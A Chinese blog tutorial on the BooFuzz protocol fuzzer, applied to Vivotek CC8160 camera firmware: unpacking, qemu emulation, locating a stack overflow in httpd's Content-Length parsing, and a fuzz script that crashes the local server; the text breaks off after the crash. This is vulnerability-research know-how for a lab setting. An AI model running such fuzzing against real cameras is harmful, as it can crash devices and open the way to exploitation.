    <content type="html"><![CDATA[<p>IOT FUZZ学习ing</p><span id="more"></span><h1 id="BooFuzz入门-Vivotek摄像头栈溢出漏洞"><a href="#BooFuzz入门-Vivotek摄像头栈溢出漏洞" class="headerlink" title="BooFuzz入门-Vivotek摄像头栈溢出漏洞"></a>BooFuzz入门-Vivotek摄像头栈溢出漏洞</h1><h2 id="BooFuzz介绍"><a href="#BooFuzz介绍" class="headerlink" title="BooFuzz介绍"></a>BooFuzz介绍</h2><p>Boofuzz是一个基于生成的黑盒协议模糊测试框架，继承自Sulley，基于python语言。</p><h2 id="BooFuzz使用"><a href="#BooFuzz使用" class="headerlink" title="BooFuzz使用"></a>BooFuzz使用</h2><p><a href="https://boofuzz.readthedocs.io/en/stable/user/quickstart.html">官方文档</a>，有User Guide和API文档</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>官方建议在python虚拟环境中使用boofuzz，同时python版本不能太低，具体可以看文档中的changelog</p><p>安装虚拟环境及boofuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install python3-venv build-essential<br></code></pre></td></tr></table></figure><p>在当前目录创建虚拟环境env，env是可以自定义的环境名称</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv env<br></code></pre></td></tr></table></figure><p>激活虚拟环境，激活后终端前面会标识(env)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source ./env/bin/activate<br></code></pre></td></tr></table></figure><p>安装最新版的pip和setuptools再安装boofuzz包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -U pip setuptools<br>pip install boofuzz<br></code></pre></td></tr></table></figure><h3 id="fuzz脚本编写"><a href="#fuzz脚本编写" class="headerlink" title="fuzz脚本编写"></a>fuzz脚本编写</h3><p><a href="https://blog.csdn.net/qq_34905587/article/details/108006828">该文章</a>实现了一个boofuzz脚本生成器，可以导入请求的文本文件生成对应的boofuzz脚本</p><p>下面是boofuzz的基本步骤以及一些不充分的解释，要熟练掌握boofuzz还得是结合api文档读源码，下面贴一张网上找的源码结构图</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.webp" alt="1"></p><h4 id="创建Session会话"><a href="#创建Session会话" class="headerlink" title="创建Session会话"></a>创建Session会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#示例</span><br>session = Session(<br>    target=Target(<br>        connection=SocketConnection(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">8080</span>, proto=<span class="hljs-string">&#x27;tcp&#x27;</span>)))<br></code></pre></td></tr></table></figure><h4 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h4><p> <a href="https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#static-primitives">静态协议定义api</a></p><p>以下面代码为例，定义了部分http请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">s_initialize(name=<span class="hljs-string">&quot;Request&quot;</span>) <br>   <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&quot;Request-Line&quot;</span>):<br>        <span class="hljs-comment"># LINE 1</span><br>        s_static(<span class="hljs-string">&quot;POST&quot;</span>, name=<span class="hljs-string">&quot;Method&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot; &quot;</span>, name=<span class="hljs-string">&#x27;space-1&#x27;</span>)<br>        s_string(<span class="hljs-string">&quot;/fromLogin&quot;</span>, name=<span class="hljs-string">&#x27;Request-URI&#x27;</span>)  <span class="hljs-comment"># variation</span><br>        s_delim(<span class="hljs-string">&quot; &quot;</span>, name=<span class="hljs-string">&#x27;space-2&#x27;</span>)<br>        s_static(<span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>, name=<span class="hljs-string">&#x27;HTTP-Version&#x27;</span>)   <br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>        <span class="hljs-comment"># LINE 2</span><br>        s_static(<span class="hljs-string">&quot;Host&quot;</span>, name=<span class="hljs-string">&quot;Host&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;: &quot;</span>)<br>        s_static(<span class="hljs-string">&quot;192.168.10.1&quot;</span>, name=<span class="hljs-string">&quot;ip&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>        <span class="hljs-comment"># LINE 3  </span><br>        s_static(<span class="hljs-string">&#x27;Content-Length&#x27;</span>)<br>        s_static(<span class="hljs-string">&#x27;: &#x27;</span>)<br>        s_size(<span class="hljs-string">&#x27;data&#x27;</span>, output_format=<span class="hljs-string">&#x27;ascii&#x27;</span>, fuzzable=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># size的值根据data部分的长度自动进行计算，同时对该字段进行fuzz</span><br>        s_static(<span class="hljs-string">&#x27;\r\n&#x27;</span>)<br>    <span class="hljs-comment"># 对应http请求数据</span><br>    <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&#x27;data&#x27;</span>):<br>        s_static(<span class="hljs-string">&#x27;login_name=&amp;curTime=1581845487827&amp;setLang=&amp;setNoAutoLang=&amp;login_n=admin&amp;login_pass=&#x27;</span>)<br>        s_string(<span class="hljs-string">&#x27;123456&#x27;</span>, max_len=<span class="hljs-number">1024</span>)<span class="hljs-comment"># 需要变异，且最大长度为1024</span><br>        s_static(<span class="hljs-string">&#x27;&amp;languageSel=1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>s_initialize</p><p>s_static生成Static primitives，是固定的，在模糊测试时不会突变</p><p>s_delim，s_string是动态的，不指定fuzzable &#x3D; false的情况下在模糊测试时会发生突变</p><p>s_size与第一个name参数对应的block块绑定，以ascii的形式返回绑定的块的大小</p><p>最终定义的消息如下，对&#x2F;fromLogin以及前后的空格，login_pass&#x3D;后的123456字段进行了fuzz</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fromLogin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.10.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>103<br><br><span class="language-dts">login_<span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>curT<span class="hljs-attr">ime</span><span class="hljs-operator">=</span><span class="hljs-number">1581845487827</span><span class="hljs-variable">&amp;</span>setL<span class="hljs-attr">ang</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>setNoAutoL<span class="hljs-attr">ang</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;login_n</span>=admin<span class="hljs-variable">&amp;login_pass</span>=<span class="hljs-number">123456</span><span class="hljs-variable">&amp;</span>languageS<span class="hljs-attr">el</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure><h4 id="链接请求，构建状态图"><a href="#链接请求，构建状态图" class="headerlink" title="链接请求，构建状态图"></a>链接请求，构建状态图</h4><p>初始的Session中是没有请求的，需要手动将之前定义的请求按照一定的先后顺序链接起来，如果只有单个请求需要fuzz，那么直接添加即可。同时也可以在两个请求之间注册回调函数，这个回调函数会在状态转移时被调用，可以来收集返回包信息等。</p><p>例如以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>))<span class="hljs-comment"># 默认前置节点为root</span><br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>), s_get(<span class="hljs-string">&#x27;setsysemailsettings&#x27;</span>), callback=add_auth_callback)<br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>),s_get(<span class="hljs-string">&#x27;setsyslogsettings&#x27;</span>), callback=add_auth_callback)<br>session.connect(s_get(<span class="hljs-string">&#x27;login&#x27;</span>),s_get(<span class="hljs-string">&#x27;setschedulesettings&#x27;</span>), callback=add_auth_callback)<br></code></pre></td></tr></table></figure><p>对应的协议树如下</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p><p>在发送完login请求完成登陆后，才能发送后面的几个请求，同时在login后添加了回调函数</p><h4 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h4><p>传入一个请求的name的话就会只fuzz这个请求，不传默认按建立的状态图去遍历着fuzz，fuzz时可以访问 <a href="http://127.0.0.1:26000/%E6%9F%A5%E7%9C%8B%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE">http://127.0.0.1:26000/查看统计数据</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.fuzz()<br></code></pre></td></tr></table></figure><h4 id="添加对目标设备的监控和重启机制等"><a href="#添加对目标设备的监控和重启机制等" class="headerlink" title="添加对目标设备的监控和重启机制等"></a>添加对目标设备的监控和重启机制等</h4><p>监视器用来检测目标是否崩溃，是否正常运行，收集目标程序返回包的信息，启动、停止和重新启动目标等。</p><p>Boofuzz 提供三种监视器：ProcessMonitor、NetworkMonitor、CallbackMonitor，它们都基于BaseMonitor，都具备BaseMonitor的基础功能。</p><p>一般可以在session中添加回调函数，回调函数有下面三种</p><ul><li><strong>pre_send_callbacks</strong> – 在每个模糊请求之前都会调用已注册的方法。 默认值：None。</li><li><strong>post_test_case_callbacks</strong> – 在每个模糊测试用例之后都会调用已注册的方法。 默认值：None。</li><li><strong>post_start_target_callbacks</strong>  – 方法将在目标启动或重新启动后调用， 比如说，通过进程监视器。</li></ul><h2 id="BooFuzz练习-Vivotek摄像头固件栈溢出漏洞"><a href="#BooFuzz练习-Vivotek摄像头固件栈溢出漏洞" class="headerlink" title="BooFuzz练习-Vivotek摄像头固件栈溢出漏洞"></a>BooFuzz练习-Vivotek摄像头固件栈溢出漏洞</h2><p><a href="https://zhuanlan.zhihu.com/p/581871058">参考</a></p><h3 id="解包固件"><a href="#解包固件" class="headerlink" title="解包固件"></a>解包固件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk -Me CC8160-VVTK-0100d.flash.pkg<br></code></pre></td></tr></table></figure><h3 id="文件结构解析"><a href="#文件结构解析" class="headerlink" title="文件结构解析"></a>文件结构解析</h3><p>使用tree命令查看文件结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs shell">_CC8160-VVTK-0100d.flash.pkg.extracted$ tree -d -L 5<br>.<br>├── _31.extracted<br>│   ├── boot<br>│   ├── defconf<br>│   │   └── _CC8160.tar.bz2.extracted<br>│   │       └── _0.extracted<br>│   │           └── etc<br>│   ├── dtb<br>│   ├── _kernel.img.extracted<br>│   │   └── _5FB4.extracted<br>│   │       ├── cpio-root<br>│   │       │   ├── dev<br>│   │       │   └── root<br>│   │       ├── dev<br>│   │       └── root<br>│   ├── nandspl<br>│   └── _rootfs.img.extracted<br>│       └── squashfs-root<br>│           ├── bin<br>│           ├── dev<br>│           │   ├── misc<br>│           │   ├── net<br>│           │   ├── pts<br>│           │   ├── shm<br>│           │   └── snd<br>│           ├── drivers<br>│           ├── etc<br>│           │   ├── default<br>│           │   ├── init.d<br>│           │   └── udhcpc<br>│           ├── home<br>│           ├── lib<br>│           │   └── iptables<br>│           ├── mnt<br>│           │   ├── auto<br>│           │   ├── flash<br>│           │   ├── flash2<br>│           │   └── ramdisk<br>│           ├── proc<br>│           ├── root<br>│           ├── sbin<br>│           ├── sys<br>│           ├── tmpfs<br>│           │   ├── CF<br>│           │   ├── samba<br>│           │   ├── tmp<br>│           │   └── var<br>│           ├── usr<br>│           │   ├── bin<br>│           │   ├── lib<br>│           │   ├── local<br>│           │   ├── sbin<br>│           │   └── share<br>│           └── www<br>│               ├── colorpicker<br>│               ├── css<br>│               ├── include<br>│               ├── pic<br>│               └── setup<br>├── _BD6E8E.extracted<br>├── _D48788.extracted<br>└── _DC7909.extracted<br>    └── setup<br>        └── vadppkg<br>            ├── _genetec-vadp-1-0-2-7.tar.gz.extracted<br>            │   └── _0.extracted<br>            └── _stratocast-1-1-1-3.tar.gz.extracted<br>                └── _0.extracted<br></code></pre></td></tr></table></figure><p>大部分内容都在_31.extracted文件夹中，其中<strong>boot</strong>文件夹中是u-boot的主程序；<strong>dtb</strong>文件夹中是内核的设备树文件；<strong>kernel.img.extracted</strong>是提取后的内核镜像文件，没东西；<strong>nandspl</strong>中没有提取出文件，但是nandspl本身是针对nandflash的二级程序加载器(secondary program loader)，也是u-boot的一部分，在u-boot主程序前执行，进行最基本的硬件初始化，比如关闭中断，内存初始化，设置堆栈等。这几个文件可以总结为以下流程：</p><p>ROM code -&gt; u-boot spl -&gt; uboot主程序 -&gt;加载kernel。</p><p>关于u-boot spl,具体可以看<a href="https://blog.csdn.net/u010632165/article/details/94429235">这里</a></p><p>然后就是最重要的<strong>rootfs.img.extracted</strong>，这是提取后的文件系统。</p><p>提取的文件系统中etc目录下很多文件都是软链接，链接到了defconf目录下的etc文件夹中，可以用’’ls -l’’命令查看.</p><h3 id="寻找服务程序"><a href="#寻找服务程序" class="headerlink" title="寻找服务程序"></a>寻找服务程序</h3><p><a href="https://www.cnblogs.com/aaronLinux/p/6860478.html">linux启动流程</a>，大致为</p><p>init程序（linuxrc） -&gt; busybox -&gt; &#x2F;etc&#x2F;inittab -&gt; &#x2F;etc&#x2F;init.d&#x2F;rcS</p><p>所以进入文件系统找到”**&#x2F;etc&#x2F;init.d&#x2F;rcS**”开机自启文件，在下面代码中用run-parts命令遍历执行了”<strong>&#x2F;etc&#x2F;rcS.d</strong>“目录下的所有可执行脚本。</p><p>这里注释标注的是Start daemons，即启动守护进程。守护进程是运行在后台的一种特殊进程，它独立于控制终端并且周期性地执行某种任务或循环等待处理某些事件的发生。很多服务进程如httpd都是守护进程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Apply patch brfore rcS.d</span><br>echo &quot;check apply_patch_before&quot;<br>if [ -f /mnt/flash2/patch/apply_patch_before ]; then<br>chmod 777 /mnt/flash2/patch/apply_patch_before<br>/mnt/flash2/patch/apply_patch_before<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Start daemons</span><br>echo &quot;run-parts -a start /etc/rcS.d&quot;<br>run-parts -a start /etc/rcS.d<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Apply patch after rcS.d</span><br>echo &quot;check apply_patch_after&quot;<br>if [ -f /mnt/flash2/patch/apply_patch_after ]; then<br>chmod 777 /mnt/flash2/patch/apply_patch_after<br>/mnt/flash2/patch/apply_patch_after<br>fi<br><br>logger &quot;init-rcS end&quot;<br>exit 0<br></code></pre></td></tr></table></figure><p>rcS.d在&#x2F;etc中是个软链接，指向”..&#x2F;mnt&#x2F;flash&#x2F;etc&#x2F;rcS.d”,在提取出的文件中位于”31.extracted&#x2F;defconf&#x2F;_CC8160.tar.bz2.extracted&#x2F;_0.extracted&#x2F;etc&#x2F;“,该目录下的文件都被软链接到了&#x2F;etc。</p><p>进入rcS.d，里面都是开机自启服务进程的执行脚本，发现执行脚本均为软连接文件，连接至”etc&#x2F;init.d&#x2F;“下的对应启动脚本文件，在启动脚本文件中可以找到可执行二进制程序的真正位置。</p><p>以httpd服务为例，启动过程如下：</p><p>&#x2F;etc&#x2F;init.d&#x2F;rcS -&gt; &#x2F;etc&#x2F;rcS.d&#x2F;S31httpd -&gt; &#x2F;etc&#x2F;init.d&#x2F;httpd -&gt; &#x2F;usr&#x2F;sbin&#x2F;httpd</p><h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><p>结合对httpd程序的逆向，可以判断这里用的是boa二次开发的web服务器</p><p>ida中查找字符串Content-Length即可，这里会将Content-Length字段后从:到\n全都复制到栈上的dest变量，没有限制长度，导致了栈溢出。</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p><h3 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h3><p>查看漏洞程序信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">file httpd</span><br>httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec httpd</span><br>    Arch:     arm-32-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8000)<br></code></pre></td></tr></table></figure><p>httpd的配置文件是&#x2F;etc&#x2F;conf.d&#x2F;boa&#x2F;boa.conf，conf.d是软链接的，这里失效了，所以要替换软链接，将31.extracted&#x2F;defconf&#x2F;_CC8160.tar.bz2.extracted&#x2F;_0.extracted&#x2F;etc中的文件复制到31.extracted&#x2F;_rootfs.img.extracted&#x2F;squashfs-root&#x2F;etc，选择全部替换</p><p>然后用户态qemu模拟运行httpd程序，尝试运行报错，无&#x2F;dev&#x2F;null</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/bin/qemu-arm-static Path_to/squashfs-root</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./squashfs-root/ /qemu-arm-static /usr/sbin/httpd</span> <br>src/boa.c:284 (main) - can&#x27;t open /dev/null: No such file or directory<br></code></pre></td></tr></table></figure><p>解决</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">touch .<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>继续运行，虽然输出Success，但是并没有对应的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./squashfs-root/ /qemu-arm-static /usr/sbin/httpd -c /etc/conf.d/boa -d</span> <br>sendto() error 20<br>[debug]add server push uri 3 video3.mjpg<br>[debug]add server push uri 4 video4.mjpg<br>gethostbyname:: Success<br></code></pre></td></tr></table></figure><p>用ida打开httpd，查看gethostbyname字符串交叉索引定位到函数。先获取hostname,再解析成ip。先.&#x2F;etc&#x2F;hosts解析再dns解析，所以这里改hosts文件中127.0.0.1对应的hostname</p><p><img src="/2023/10/30/BooFuzz%E5%85%A5%E9%97%A8-Vivotek%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><p>先hostname获取主机名，再把hosts文件中的Network-Camera改成主机名</p><p>在&#x2F;etc&#x2F;init.d&#x2F;httpd中找到httpd的启动参数，运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chroot</span> ./ /qemu-arm-static /usr/sbin/httpd -c /etc/conf.d/boa -d</span>  <br>sendto() error 20<br>[debug]add server push uri 3 video3.mjpg<br>[debug]add server push uri 4 video4.mjpg<br>[debug] after ini, server_push_uri[0] is /video3.mjpg<br>[debug] after ini, server_push_uri[1] is /video4.mjpg<br>fopen pid file: Not a directory<br>[01/Nov/2023:04:13:00 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)<br>[01/Nov/2023:04:13:00 +0000] boa: starting server pid=4978, port 80<br></code></pre></td></tr></table></figure><p>访问127.0.0.1发现服务正常，运行成功</p><h3 id="进行fuzz"><a href="#进行fuzz" class="headerlink" title="进行fuzz"></a>进行fuzz</h3><p><a href="https://zhuanlan.zhihu.com/p/581871058">脚本来源</a></p><p>只对Content-Length字段进行fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boofuzz <span class="hljs-keyword">import</span>*<br>IP = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>PORT = <span class="hljs-number">80</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_response</span>(<span class="hljs-params">target,fuzz_data_logger,session,*args,**kwargs</span>):<br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Checking for response ...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        response = target.recv(<span class="hljs-number">512</span>)<br>    <span class="hljs-keyword">except</span>:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Unable to connect ...&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Empty response ...&quot;</span>)<br>        target.close()<br>        <span class="hljs-keyword">return</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Start checking ...\n&quot;</span>+response.decode())<br>    target.close()<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    session = Session(<br>        target=Target(connection=SocketConnection(IP,PORT,proto=<span class="hljs-string">&quot;tcp&quot;</span>),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>    )<br>    s_initialize(name=<span class="hljs-string">&quot;FUZZ&quot;</span>)<br>    <span class="hljs-keyword">with</span> s_block(<span class="hljs-string">&quot;Request-Line&quot;</span>):<br>        <span class="hljs-comment"># Method</span><br>        s_group(<span class="hljs-string">&quot;Method&quot;</span>,[<span class="hljs-string">&quot;POST&quot;</span>])<br>        s_delim(<span class="hljs-string">&quot; &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;/cgi-bin/admin/upgrade.cgi &quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;URI&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>,name=<span class="hljs-string">&quot;Version&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,name=<span class="hljs-string">&quot;CRLF&quot;</span>)<br>        <span class="hljs-comment"># Host</span><br>        s_static(<span class="hljs-string">&quot;Host&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;IP&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        <span class="hljs-comment"># Connection</span><br>        s_static(<span class="hljs-string">&quot;Connection&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>,fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;Close&quot;</span>,fuzzable=<span class="hljs-literal">False</span>,name=<span class="hljs-string">&quot;Active&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        <span class="hljs-comment"># Content-Length</span><br>        s_static(<span class="hljs-string">&quot;Content-Length&quot;</span>)<br>        s_delim(<span class="hljs-string">&quot;: &quot;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_string(<span class="hljs-string">&quot;65&quot;</span>, fuzzable=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># End</span><br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>        s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br><br>    session.connect(s_get(<span class="hljs-string">&quot;FUZZ&quot;</span>))<br>    session.fuzz()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>可以看到在Test Case 1中没有返回，程序已经崩溃</p><p><img 